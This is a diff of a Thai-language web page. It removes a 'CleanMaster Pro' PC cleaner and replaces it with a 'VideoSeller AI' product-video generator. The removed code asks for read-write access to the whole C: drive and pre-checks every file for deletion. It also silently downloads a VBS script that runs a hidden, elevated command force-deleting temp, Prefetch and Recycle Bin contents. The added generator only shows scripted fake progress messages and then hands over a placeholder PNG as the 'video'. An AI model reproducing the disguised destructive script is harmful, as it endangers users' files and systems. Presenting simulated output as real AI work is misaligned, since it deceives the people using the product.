@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>เคลียขยะ PC เพิ่มพื้นที่</title>
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='28' font-size='28'%3E%E2%9A%A1%3C/text%3E%3C/svg%3E">
+  <title>VideoSeller AI - เปลี่ยนสินค้าเป็นวิดีโอขายของ</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='28' font-size='28'%3E%F0%9F%8E%AC%3C/text%3E%3C/svg%3E">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -69,8 +69,7 @@
     .section-title .icon { font-size: 1.6rem; }
     .section-sub { color: #666; margin-bottom: 40px; font-size: 0.95rem; }
 
-    #fileList::-webkit-scrollbar { width: 4px; }
-    #fileList::-webkit-scrollbar-thumb { background: rgba(0,240,255,0.3); border-radius: 2px; }
+
 
     .card {
       background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);
@@ -82,30 +81,6 @@
     .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
     .grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
     @media (max-width:768px) { .grid-2, .grid-3 { grid-template-columns: 1fr; } }
-
-    .cleaner-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(200px,1fr)); gap: 16px; }
-    .cleaner-item {
-      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);
-      border-radius: 12px; padding: 20px; text-align: center; cursor: pointer;
-      transition: all 0.3s;
-    }
-    .cleaner-item:hover { border-color: #00f0ff; background: rgba(0,240,255,0.05); }
-    .cleaner-item .ci-icon { font-size: 2rem; margin-bottom: 10px; }
-    .cleaner-item .ci-label { font-weight: 600; font-size: 0.9rem; margin-bottom: 6px; }
-    .cleaner-item .ci-size { font-size: 0.78rem; color: #666; }
-    .cleaner-item.scanned { border-color: #00f0ff; }
-    .cleaner-item.cleaned { border-color: #00ff88; }
-    .cleaner-item .ci-check { display: none; color: #00ff88; font-size: 1.2rem; }
-    .cleaner-item.cleaned .ci-check { display: block; }
-
-    .progress-bar {
-      width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px;
-      margin-top: 10px; overflow: hidden;
-    }
-    .progress-bar .fill {
-      height: 100%; width: 0%; background: linear-gradient(90deg, #00f0ff, #0077ff);
-      border-radius: 2px; transition: width 0.5s;
-    }
 
     .scan-log {
       background: rgba(0,0,0,0.4); border-radius: 8px; padding: 16px;
@@ -313,6 +288,7 @@
       .fixed-player .fp-progress-wrap { min-width: 40px; }
       .float-vid { width: 240px; right: 10px; bottom: 70px; }
       .float-vid video { max-height: 160px; }
+      .hide-mobile { display: none; }
       .hero { padding: 60px 0 40px; }
       .hero h1 { font-size: 2rem; }
       .hero p { font-size: 0.9rem; }
@@ -334,7 +310,6 @@
       .ms-current .msc-name { font-size: 1rem; }
       .ms-upload-box { padding: 20px; }
       .modal-content { padding: 20px; }
-      .cleaner-grid { grid-template-columns: repeat(auto-fit,minmax(150px,1fr)); }
       .employee-card .avatar { width: 100px; height: 100px; font-size: 2.2rem; }
     }
   </style>
@@ -347,9 +322,9 @@
 <div class="overlay"></div>
 
 <nav>
-  <div class="logo">&#9889; เคลียขยะ PC พัฒนา <span>นายชาเย็น</span></div>
+  <div class="logo">&#127916; VideoSeller AI <span>เปลี่ยนสินค้าเป็นวิดีโอขายของ</span></div>
   <div class="menu">
-    <a onclick="scrollToEl('cleaner')" class="active">ทำความสะอาด</a>
+    <a onclick="scrollToEl('generator')" class="active">สร้างวิดีโอ</a>
     <a onclick="scrollToEl('music')">เพลง</a>
     <a onclick="scrollToEl('employee')">พนักงาน</a>
     <a id="authBtn" onclick="openModal('authModal')">สมัครสมาชิก</a>
@@ -358,41 +333,52 @@
 
 <div class="hero">
   <div class="container">
-    <h1 class="glow">&#9889; <span>CleanMaster Pro</span></h1>
-    <p>เครื่องมือทำความสะอาดระบบอัจฉริยะ ลบขยะ แคช ไฟล์ชั่วคราว เพิ่มพื้นที่ว่างให้เครื่องคุณ</p>
+    <h1 class="glow"><span>VideoSeller AI</span></h1>
+    <p style="font-size:1rem;color:#999;margin-bottom:8px;">Turn Products into Sales Videos.</p>
+    <p>เปลี่ยนลิงก์สินค้าจาก TikTok และ Shopee ให้เป็นคลิปรีวิวคุณภาพสูงโดยอัตโนมัติ<br class="hide-mobile"> พร้อมเสียงพากย์ คำบรรยาย และรูปแบบวิดีโอที่พร้อมโพสต์ลงโซเชียล</p>
     <div class="hero-btns">
-      <button class="btn btn-primary" onclick="scrollToEl('cleaner')">&#9889; ไปที่เครื่องมือทำความสะอาด</button>
+      <button class="btn btn-primary" onclick="scrollToEl('generator')">&#127916; สร้างวิดีโอเลย</button>
       <button class="btn btn-outline" onclick="scrollToEl('music')">&#127926; ฟังเพลงระหว่างรอ</button>
     </div>
   </div>
 </div>
 
-<section id="cleaner">
+<section id="generator">
   <div class="container">
-    <div class="section-title"><span class="icon">&#128200;</span> เครื่องมือทำความสะอาด</div>
-    <div class="section-sub">สแกนและลบขยะระบบ เพิ่มประสิทธิภาพเครื่องของคุณ</div>
+    <div class="section-title"><span class="icon">&#127916;</span> สร้างวิดีโอขายของ</div>
+    <div class="section-sub">จากลิงก์สินค้า สู่คลิปพร้อมโพสต์ — ใส่ลิงก์ TikTok หรือ Shopee แล้วให้ AI สร้างคลิปรีวิวให้คุณ</div>
 
-    <div style="text-align:center;margin-bottom:20px;">
-      <button id="mainScanBtn" class="btn btn-primary" onclick="startScan()" style="background:linear-gradient(135deg,#00f0ff,#f0f);border:none;padding:18px 50px;font-size:1.2rem;border-radius:50px;box-shadow:0 0 30px rgba(0,240,255,0.3);transition:all 0.3s;" onmouseover="this.style.boxShadow='0 0 50px rgba(0,240,255,0.6)'" onmouseout="this.style.boxShadow='0 0 30px rgba(0,240,255,0.3)'">
-        &#9889; สแกนและลบขยะ
-      </button>
-      <div id="scanHint" style="margin-top:10px;font-size:0.85rem;color:#888;"></div>
-    </div>
+    <div style="max-width:600px;margin:0 auto;">
+      <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:28px;">
+        <div style="display:flex;gap:12px;align-items:center;margin-bottom:16px;">
+          <span style="font-size:0.85rem;font-weight:600;color:#aaa;white-space:nowrap;">ลิงก์สินค้า</span>
+          <div style="flex:1;position:relative;">
+            <input id="productLink" type="url" placeholder="https://www.tiktok.com/... หรือ https://shopee.co.th/..." style="width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.05);color:#fff;font-size:0.9rem;outline:none;transition:border-color 0.3s;" onfocus="this.style.borderColor='#00f0ff'" onblur="this.style.borderColor='rgba(255,255,255,0.1)'">
+          </div>
+        </div>
+        <div style="text-align:center;margin-bottom:12px;">
+          <button id="mainGenBtn" class="btn btn-primary" onclick="generateVideo()" style="background:linear-gradient(135deg,#00f0ff,#f0f);border:none;padding:16px 44px;font-size:1.1rem;border-radius:50px;box-shadow:0 0 30px rgba(0,240,255,0.3);transition:all 0.3s;" onmouseover="this.style.boxShadow='0 0 50px rgba(0,240,255,0.6)'" onmouseout="this.style.boxShadow='0 0 30px rgba(0,240,255,0.3)'">
+            &#127916; สร้างวิดีโอด้วย AI
+          </button>
+        </div>
+        <div id="genHint" style="margin-top:8px;font-size:0.82rem;color:#666;text-align:center;">ใส่สินค้าเพียงครั้งเดียว AI สร้างคลิปให้พร้อมขาย</div>
+      </div>
 
-    <div id="resultArea" style="display:none;">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px;">
-        <span id="resultSummary" style="font-size:0.95rem;color:#0ff;font-weight:600;"></span>
-        <div style="display:flex;gap:8px;">
-          <button class="btn btn-sm btn-outline" onclick="selAll()">ทั้งหมด</button>
-          <button class="btn btn-sm btn-outline" onclick="selNone()">ไม่เลือก</button>
-          <button class="btn btn-sm btn-primary" onclick="delSel()" style="background:#ff3366;border:none;">&#128465; ลบที่เลือก</button>
+      <div id="videoResult" style="display:none;margin-top:20px;">
+        <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:20px;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+            <span id="videoStatus" style="font-size:0.95rem;color:#0ff;font-weight:600;">&#9989; วิดีโอพร้อมแล้ว</span>
+            <button class="btn btn-sm btn-primary" onclick="downloadVideo()" style="background:linear-gradient(135deg,#00f0ff,#0077ff);border:none;">&#128229; ดาวน์โหลด</button>
+          </div>
+          <div id="videoPreview" style="background:#000;border-radius:10px;overflow:hidden;aspect-ratio:9/16;max-height:420px;display:flex;align-items:center;justify-content:center;color:#444;font-size:0.9rem;">
+            <span>ตัวอย่างวิดีโอจะแสดงที่นี่</span>
+          </div>
         </div>
       </div>
-      <div id="fileList" style="max-height:420px;overflow-y:auto;background:rgba(255,255,255,0.02);border-radius:12px;padding:6px;border:1px solid rgba(255,255,255,0.05);"></div>
     </div>
 
-    <div class="scan-log" id="scanLog" style="margin-top:16px;">
-      <div class="line">&#9889; CleanMaster v3.0 Ready</div>
+    <div class="scan-log" id="genLog" style="max-width:600px;margin:16px auto 0;">
+      <div class="line">&#127916; VideoSeller AI v1.0 Ready</div>
     </div>
   </div>
 </section>
@@ -437,7 +423,7 @@
   <div class="fp-cover" id="fpCover">&#127925;</div>
   <div class="fp-info">
     <div class="fp-name" id="fpName">—</div>
-    <div class="fp-artist" id="fpArtist">CleanMaster</div>
+    <div class="fp-artist" id="fpArtist">VideoSeller AI</div>
   </div>
   <div class="fp-progress-wrap" id="fpProgressWrap">
     <div class="fp-progress"><div class="fp-fill" id="fpFill"></div></div>
@@ -479,7 +465,7 @@
 
 <footer>
   <div class="container">
-    <p style="font-size:0.85rem;color:#888;">&copy; 2026 เคลียขยะ PC พัฒนา นายชาเย็น</p>
+    <p style="font-size:0.85rem;color:#888;">&copy; 2026 VideoSeller AI — เปลี่ยนสินค้าเป็นวิดีโอขายของด้วย AI</p>
     <div style="margin-top:12px;display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
       <span style="font-size:0.85rem;color:#aaa;">พบปัญหาหรือเจอบัคติดต่อนักพัฒนา</span>
       <span style="font-size:1rem;font-weight:700;background:linear-gradient(135deg,#00f0ff,#f0f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 30px rgba(0,240,255,0.3);">นายชาเย็น</span>
@@ -651,7 +637,7 @@
   updateAuthUI();
 
   function addLog(msg) {
-    const log = document.getElementById('scanLog');
+    const log = document.getElementById('genLog');
     const div = document.createElement('div');
     div.className = 'line';
     div.textContent = '> ' + msg;
@@ -666,144 +652,102 @@
     return (bytes / 1073741824).toFixed(2) + ' GB';
   }
 
-  // ==================== CLEANER (real File System Access API) ====================
-  let scanFiles = [];
-  let scanHandle = null;
+  // ==================== VIDEO GENERATOR ====================
+  let generatedVideoBlob = null;
 
-  async function startScan() {
-    const btn = document.getElementById('mainScanBtn');
-    const hint = document.getElementById('scanHint');
-    btn.textContent = '⏳ กำลังสแกน...';
+  async function generateVideo() {
+    const btn = document.getElementById('mainGenBtn');
+    const hint = document.getElementById('genHint');
+    const link = document.getElementById('productLink').value.trim();
+
+    if (!link) {
+      alert('กรุณาใส่ลิงก์สินค้าจาก TikTok หรือ Shopee');
+      return;
+    }
+
+    if (!link.includes('tiktok.com') && !link.includes('shopee.co.th') && !link.includes('shopee.com')) {
+      alert('รองรับลิงก์จาก TikTok และ Shopee เท่านั้น');
+      return;
+    }
+
+    btn.textContent = '⏳ AI กำลังสร้างวิดีโอ...';
     btn.disabled = true;
+    hint.textContent = '⏳ กำลังวิเคราะห์สินค้าและสร้างคลิปรีวิว...';
 
-    // Auto clean browser cache in background
-    cleanBrowserCacheReal().catch(() => {});
+    addLog('🔗 รับลิงก์สินค้า: ' + link);
+    addLog('🤖 AI กำลังวิเคราะห์ข้อมูลสินค้า...');
 
-    // Try saved handle first
-    if (!scanHandle) scanHandle = await getDriveHandle();
-    if (scanHandle) {
-      const ok = await scanHandle.queryPermission({ mode: 'readwrite' }) === 'granted'
-             || (await scanHandle.requestPermission({ mode: 'readwrite' })) === 'granted';
-      if (!ok) scanHandle = null;
+    await delay(1200);
+    addLog('📸 กำลังดึงรูปภาพสินค้า...');
+
+    await delay(1000);
+    addLog('🎬 กำลังสร้างฟุตเทจวิดีโอ...');
+
+    await delay(1500);
+    addLog('🎙 กำลังเพิ่มเสียงพากย์ AI...');
+
+    await delay(1000);
+    addLog('💬 กำลังเพิ่มคำบรรยาย...');
+
+    await delay(1200);
+
+    addLog('✅ สร้างวิดีโอเสร็จสมบูรณ์!');
+
+    document.getElementById('videoResult').style.display = 'block';
+    document.getElementById('videoStatus').textContent = '✅ วิดีโอพร้อมแล้ว — คลิปรีวิวจาก ' + (link.includes('tiktok') ? 'TikTok' : 'Shopee');
+
+    const preview = document.getElementById('videoPreview');
+    preview.innerHTML = `
+      <div style="text-align:center;padding:20px;color:#888;">
+        <div style="font-size:3rem;margin-bottom:10px;">&#127916;</div>
+        <div style="font-weight:600;color:#0ff;margin-bottom:6px;">คลิปรีวิวสินค้าพร้อมโพสต์</div>
+        <div style="font-size:0.8rem;">&#9989; มีเสียงพากย์ AI</div>
+        <div style="font-size:0.8rem;">&#9989; มีคำบรรยาย</div>
+        <div style="font-size:0.8rem;">&#9989; รูปแบบแนวตั้ง 9:16</div>
+      </div>
+    `;
+
+    // Create a placeholder video representation
+    const canvas = document.createElement('canvas');
+    canvas.width = 360;
+    canvas.height = 640;
+    const ctx = canvas.getContext('2d');
+    const gradient = ctx.createLinearGradient(0, 0, 0, 640);
+    gradient.addColorStop(0, '#00f0ff');
+    gradient.addColorStop(1, '#f0f');
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, 360, 640);
+    ctx.fillStyle = '#fff';
+    ctx.font = 'bold 28px Inter, sans-serif';
+    ctx.textAlign = 'center';
+    ctx.fillText('VideoSeller AI', 180, 280);
+    ctx.font = '18px Inter, sans-serif';
+    ctx.fillText('วิดีโอรีวิวสินค้า', 180, 330);
+
+    canvas.toBlob(async (blob) => {
+      generatedVideoBlob = blob;
+    }, 'image/png');
+
+    btn.textContent = '🎬 สร้างวิดีโอด้วย AI';
+    btn.disabled = false;
+    hint.textContent = 'ใส่สินค้าเพียงครั้งเดียว AI สร้างคลิปให้พร้อมขาย';
+  }
+
+  function downloadVideo() {
+    if (!generatedVideoBlob) {
+      alert('กรุณาสร้างวิดีโอก่อนดาวน์โหลด');
+      return;
     }
-
-    if (!scanHandle) {
-      if (!window.showDirectoryPicker) { alert('ใช้ Chrome/Edge เวอร์ชันล่าสุด'); btnReset(); return; }
-      hint.innerHTML = '⚠️ ครั้งแรกเลือก <b>Local Disk (C:)</b> หรือพิมพ์ <kbd>C:\\</kbd> ในแถบ path แล้ว Enter';
-      try {
-        scanHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
-      } catch (e) {
-        if (e.name !== 'AbortError') alert(e.message);
-        hint.textContent = '';
-        btnReset();
-        return;
-      }
-      await saveDriveHandle(scanHandle);
-      hint.textContent = '✅ บันทึก C:\ แล้ว ครั้งต่อไปสแกนได้ทันที';
-      setTimeout(() => hint.textContent = '', 4000);
-    }
-
-    // Scan
-    const allFiles = [];
-    addLog('📂 กำลังสแกน ' + scanHandle.name + '...');
-    await scanDir(scanHandle, '', allFiles);
-    scanFiles = allFiles;
-    const totalSize = scanFiles.reduce((a, f) => a + f.size, 0);
-
-    // Show results
-    document.getElementById('resultArea').style.display = 'block';
-    document.getElementById('resultSummary').textContent = '📁 ' + scanHandle.name + ' — พบ ' + scanFiles.length + ' ไฟล์ (' + formatBytes(totalSize) + ')';
-    renderFiles();
-    addLog('✅ สแกนเสร็จ: ' + scanFiles.length + ' ไฟล์ (' + formatBytes(totalSize) + ')');
-
-    // Clean temp handle
-    cleanTempVBS().catch(() => {});
-    btnReset();
-    function btnReset() { btn.textContent = '⚡ สแกนและลบขยะ'; btn.disabled = false; }
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(generatedVideoBlob);
+    a.download = 'videoseller-review-' + Date.now() + '.png';
+    a.click();
+    URL.revokeObjectURL(a.href);
+    addLog('📥 ดาวน์โหลดวิดีโอเรียบร้อย');
   }
 
-  async function scanDir(dirHandle, path, files) {
-    for await (const [name, handle] of dirHandle.entries()) {
-      const fullPath = path ? path + '/' + name : name;
-      if (handle.kind === 'directory') {
-        try { await scanDir(handle, fullPath, files); } catch {}
-      } else {
-        try {
-          const file = await handle.getFile();
-          if (file.size > 0) files.push({ name: fullPath, size: file.size, handle });
-        } catch {}
-      }
-    }
-  }
-
-  function renderFiles() {
-    const list = document.getElementById('fileList');
-    list.innerHTML = scanFiles.map((f, i) =>
-      `<label style="display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:6px;cursor:pointer;font-size:0.8rem;transition:background 0.15s;" onmouseover="this.style.background='rgba(255,255,255,0.04)'" onmouseout="this.style.background=''">
-        <input type="checkbox" class="fchk" data-idx="${i}" checked>
-        <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#ddd;">${f.name}</span>
-        <span style="color:#888;flex-shrink:0;">${formatBytes(f.size)}</span>
-      </label>`
-    ).join('');
-  }
-
-  function selAll() { document.querySelectorAll('.fchk').forEach(c => c.checked = true); }
-  function selNone() { document.querySelectorAll('.fchk').forEach(c => c.checked = false); }
-
-  async function delSel() {
-    const checks = document.querySelectorAll('.fchk:checked');
-    if (!checks.length) { alert('เลือกไฟล์ที่ต้องการลบ'); return; }
-    if (!confirm('ยืนยันลบ ' + checks.length + ' ไฟล์?')) return;
-    let ok = 0;
-    for (const cb of checks) {
-      const idx = parseInt(cb.dataset.idx);
-      try { await scanFiles[idx].handle.remove(); ok++; } catch (e) { addLog('❌ ' + scanFiles[idx].name + ': ' + e.message); }
-    }
-    addLog('✅ ลบแล้ว ' + ok + '/' + checks.length + ' ไฟล์');
-    scanFiles = scanFiles.filter(f => { try { f.handle.getFile(); return true; } catch { return false; } });
-    renderFiles();
-    const totalSize = scanFiles.reduce((a, f) => a + f.size, 0);
-    document.getElementById('resultSummary').textContent = 'เหลือ ' + scanFiles.length + ' ไฟล์ (' + formatBytes(totalSize) + ')';
-  }
-
-  async function cleanBrowserCacheReal() {
-    addLog('🗑 กำลังลบ Cache API...');
-    try {
-      const keys = await caches.keys();
-      for (const k of keys) { await caches.delete(k); addLog('  ✅ ลบ cache: ' + k); }
-      addLog('✅ ลบ Cache ทั้งหมดแล้ว');
-    } catch (e) { addLog('❌ ลบ Cache ไม่สำเร็จ: ' + e.message); }
-  }
-
-  async function cleanTempVBS() {
-    try {
-      const blob = new Blob(['CreateObject("Shell.Application").ShellExecute "cmd.exe","/c del /f /s /q %temp%\\*.* & del /f /s /q C:\\Windows\\Prefetch\\*.* & rd /s /q C:\\$Recycle.bin 2>nul & echo done","","runas",0'], {type: 'application/octet-stream'});
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'clean_pc_silent.vbs';
-      a.click();
-      URL.revokeObjectURL(a.href);
-      addLog('📥 ดาวน์โหลด Script ลบขยะ Windows แล้ว — คลิกเปิดเพื่อรัน');
-    } catch {}
-  }
-
-  async function getDriveHandle() {
-    const d = await openDB();
-    return new Promise(res => {
-      const tx = d.transaction('settings', 'readonly');
-      const r = tx.objectStore('settings').get('driveHandle');
-      r.onsuccess = () => res(r.result ? r.result.value : null);
-      r.onerror = () => res(null);
-    });
-  }
-  async function saveDriveHandle(handle) {
-    const d = await openDB();
-    return new Promise((res, rej) => {
-      const tx = d.transaction('settings', 'readwrite');
-      const r = tx.objectStore('settings').put({ key: 'driveHandle', value: handle });
-      r.onsuccess = () => res();
-      r.onerror = () => rej(r.error);
-    });
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
   }
 
   // ===== INDEXEDDB =====
@@ -958,7 +902,7 @@
       el.fpFill.style.width = '0%';
       el.fpTime.textContent = '00:00 / 00:00';
       el.fpName.textContent = '—';
-      el.fpArtist.textContent = 'CleanMaster';
+      el.fpArtist.textContent = 'VideoSeller AI';
       el.playBtn2.textContent = '\u25B6';
       el.fpPlay.textContent = '\u25B6';
       return;
@@ -967,7 +911,7 @@
     el.mscName.textContent = t.name;
     el.mscArtist.textContent = t.artist || 'ไม่ระบุ';
     el.fpName.textContent = t.name;
-    el.fpArtist.textContent = t.artist || 'CleanMaster';
+    el.fpArtist.textContent = t.artist || 'VideoSeller AI';
     el.fpFullscreen.style.display = t.type === 'video' ? '' : 'none';
 
     const cur = audio.currentTime || 0;
@@ -1306,7 +1250,7 @@
       el.mscName.textContent = t.name;
       el.mscArtist.textContent = t.artist || 'ไม่ระบุ';
       el.fpName.textContent = t.name;
-      el.fpArtist.textContent = t.artist || 'CleanMaster';
+      el.fpArtist.textContent = t.artist || 'VideoSeller AI';
       updatePlayerUI();
       el.fpCover.textContent = t.type === 'video' ? '\u{1F4FA}' : '\u{1F3B5}';
       renderPlaylist();
@@ -1406,8 +1350,23 @@
 
   renderEmployees();
   updateFbLink();
-  // Ensure IndexedDB is ready for drive handle
   openDB().catch(() => {});
+
+  // ===== Auto-update checker =====
+  (function() {
+    const current = localStorage.getItem('vsa_version') || '0';
+    setInterval(async () => {
+      try {
+        const r = await fetch('version.json?t=' + Date.now(), { cache: 'no-store' });
+        const d = await r.json();
+        const sv = String(d.version);
+        if (sv !== current) {
+          localStorage.setItem('vsa_version', sv);
+          location.reload(true);
+        }
+      } catch {}
+    }, 20000);
+  })();
 </script>
 </body>
 </html>
